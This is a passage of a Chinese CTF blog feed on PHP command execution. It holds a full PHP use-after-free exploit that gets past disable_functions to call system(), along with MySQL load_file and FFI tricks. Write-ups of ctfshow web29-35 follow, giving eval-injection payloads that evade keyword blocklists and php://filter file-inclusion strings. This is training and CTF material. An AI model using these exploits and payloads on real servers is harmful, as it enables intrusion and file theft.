class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?&gt;&lt;?php</span><br><span class="line"></span><br><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="利用其他应用"><a href="#利用其他应用" class="headerlink" title="利用其他应用"></a>利用其他应用</h4><p>如mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagc.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h3 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h3><blockquote><p>FFI扩展已经通过RFC，正式成为PHP 7.4核心扩展。</p><p>什么是FFI</p><p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p><p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag&gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web安全之命令执行&quot;&gt;&lt;a href=&quot;#web安全之命令执行&quot; class=&quot;headerlink&quot; title=&quot;web安全之命令执行&quot;&gt;&lt;/a&gt;web安全之命令执行&lt;/h1&gt;&lt;p&gt;无聊时间，写点最近一直研究的命令执行的一些心得与总结。&lt;/p&gt;
&lt;p&gt;希望做</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow命令执行</title>
    <link href="http://websec.space/2022/01/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://websec.space/2022/01/29/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-01-28T16:00:00.000Z</published>
    <updated>2022-02-11T09:12:01.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow命令执行"><a href="#ctfshow命令执行" class="headerlink" title="ctfshow命令执行"></a>ctfshow命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><blockquote><p>命令执行，需要严格的过滤</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>只过滤了flag</p><p>payload1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=system(&#x27;cat fl&quot;&quot;ag.php&#x27;);</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=system(&#x27;cat fla``g.php&#x27;);</span><br></pre></td></tr></table></figure><p>官方payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><blockquote><p>命令执行，需要严格的过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了system，考虑用highlight_file结果失败了</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><blockquote><p>命令执行，需要严格的过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤的有点太狠了</p><p>查看当前文件夹的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>exp1：</p><p>只能得到数组的第二位或者倒数第二位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp2：</p><p>随机获取，需要多刷新几次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp3：鸡肋，有时候不能拿到实际值</p><p>session_start(): 告诉PHP使用<a href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>;    session_id(): 获取到当前的session_id值；手动设置cookie中PHPSESSID=flag.php；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>看到这里我想说寄，过滤了括号和空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>在此使用文件包含exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h3><p><strong>条件</strong>：</p><p><code>allow_url_fopen</code>:off/on</p><p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p><p>作用<strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于</strong>读取源码<strong>，<code>php://input</code>用于</strong>执行php代码**。</p><p>说明：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。不要用hacker传参</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=TvNqxQJsmPli714fAg4qxA==.jfUSJBdJsmST/7kefiWpUGR3c09fXjXvpga5K0ExDmpAxVkhIcaZZ7Oag21SmAlO">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><p>实例：</p><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATA部分](不要用hackbar传参)</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只比上题多过滤了”所以方法不变</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    